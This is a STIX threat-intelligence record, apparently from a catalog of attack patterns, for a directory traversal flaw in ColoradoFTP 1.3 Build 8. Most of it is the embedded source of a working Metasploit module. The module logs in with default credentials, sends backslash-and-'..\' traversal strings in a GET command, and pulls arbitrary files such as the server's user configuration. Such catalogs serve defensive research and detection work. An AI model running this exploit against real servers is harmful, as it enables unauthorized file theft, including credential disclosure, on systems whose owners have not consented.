{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05ef353d-09b6-46b6-b2eb-355aaeb1e114",
    "created": "2024-08-14T16:28:15.551533Z",
    "modified": "2024-08-14T16:28:15.551537Z",
    "name": "ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure",
    "description": " This module exploits a directory traversal vulnerability found in ColoradoFTP server version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files from the server GET/PUT command including file system traversal strings starting with '\\\\\\'. The server is written in Java and therefore platform independent, however this vulnerability is only exploitable on the Windows version.  'Platform'       => 'win'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ftp/colorado_ftp_traversal.rb",
            "external_id": "colorado_ftp_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86"
        },
        {
            "source_name": "reference",
            "url": "https://bugtraq.securityfocus.com/archive/1/539186"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability found in ColoradoFTP server\n        version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files\n        from the server GET/PUT command including file system traversal strings starting with '\\\\\\'.\n        The server is written in Java and therefore platform independent, however this vulnerability is only\n        exploitable on the Windows version.\n      },\n      'Platform'       => 'win',\n      'Author'         =>\n        [\n          'h00die <mike@shorebreaksecurity.com>',\n          'RvLaboratory', #discovery\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'EDB', '40231'],\n          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86'],\n          [ 'URL', 'https://bugtraq.securityfocus.com/archive/1/539186']\n        ],\n      'DisclosureDate' => '2016-08-11'\n    ))\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 2 ]),\n        OptString.new('PATH', [ true, 'Path to the file to disclose, relative to the root dir.', 'conf\\\\xml-users.xml']),\n        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser'], fallbacks: ['USERNAME']), #override default\n        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123'], fallbacks: ['PASSWORD']) #override default\n      ])\n\n  end\n\n  def check_host(ip)\n    begin\n      connect\n      if /Welcome to ColoradoFTP - the open source FTP server \\(www\\.coldcore\\.com\\)/i === banner\n        return Exploit::CheckCode::Detected\n      end\n    ensure\n      disconnect\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run_host(ip)\n    begin\n      connect_login\n      file_path = datastore['PATH']\n      file = ::File.basename(file_path)\n\n      # make RETR request and store server response message...\n      retr_cmd = '\\\\\\\\\\\\' + (\"..\\\\\" * datastore['DEPTH'] ) + \"#{file_path}\"\n      res = send_cmd_data( ['get', retr_cmd], '')\n      unless res.nil?\n        print_status(res[0])\n        response_data = res[1]\n      else\n        print_error(\"#{file} not found or invalid login\")\n        return\n      end\n\n      if response_data.length == 0\n        print_status(\"File (#{file_path})from #{peer} is empty...\")\n        return\n      end\n\n      # store file data to loot\n      loot_file = store_loot(\"coloradoftp.ftp.data\", \"text\", rhost, response_data, file, file_path)\n      vprint_status(\"Data returned:\\n\")\n      vprint_line(response_data)\n      print_good(\"Stored #{file_path} to #{loot_file}\")\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      vprint_error(e.message)\n      elog(e)\n    rescue ::Timeout::Error, ::Errno::EPIPE => e\n      vprint_error(e.message)\n      elog(e)\n    ensure\n      data_disconnect\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-11"
}